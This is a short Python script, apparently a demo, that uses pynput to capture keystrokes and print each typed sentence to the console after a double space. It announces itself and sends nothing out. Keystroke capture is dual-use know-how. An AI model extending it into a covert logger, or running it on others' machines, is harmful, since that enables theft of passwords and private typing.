from pynput.keyboard import Key, Listener

logged_sentence = ""
space_count = 0

# This function will be called whenever a key is pressed
def on_press(key):
    global logged_sentence, space_count
    
    try:
        # If a regular character key is pressed, add it to the sentence
        if key.char is not None:
            logged_sentence += key.char
            space_count = 0  # Reset space count on any non-space character
    except AttributeError:
        # Handle special keys like space, etc.
        if key == Key.space:
            space_count += 1
            logged_sentence += ' '  # Add a space to the sentence
            
            # Check if space is pressed twice
            if space_count == 2:
                print(f"\nKeylogged sentence: {logged_sentence.strip()}")
                logged_sentence = ""  # Reset the sentence after displaying
                space_count = 0  # Reset space count
        else:
            # Handle other special keys like backspace, enter, etc.
            if key == Key.backspace:
                logged_sentence = logged_sentence[:-1]
                space_count = 0
            else:
                space_count = 0  # Reset space count on any other key

# This function will be called whenever a key is released
def on_release(key):
    if key == Key.esc:
        # Stop listener if 'Esc' is pressed
        return False

print("** Type the Sentence Keylogger Has been Started **")
print("To Complete Press Space (Twice)")
# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
